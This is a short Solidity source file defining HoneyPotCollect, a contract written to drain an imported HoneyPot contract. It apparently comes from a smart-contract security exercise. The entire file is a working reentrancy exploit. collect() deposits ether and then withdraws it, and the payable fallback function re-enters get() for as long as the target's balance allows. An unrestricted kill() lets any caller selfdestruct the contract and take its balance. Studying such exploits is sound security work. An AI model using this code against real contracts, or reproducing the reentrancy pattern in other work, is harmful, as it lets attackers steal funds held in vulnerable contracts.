pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract HoneyPotCollect {

  HoneyPot public honeypot;

  constructor(address _honeypot) public {
    honeypot = HoneyPot(_honeypot);
  }

  function kill() public {
    selfdestruct(msg.sender);
  }

  function collect() payable public {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function() payable public {
    if (address(honeypot).balance >= msg.value) {
      honeypot.get();
    }
  }
}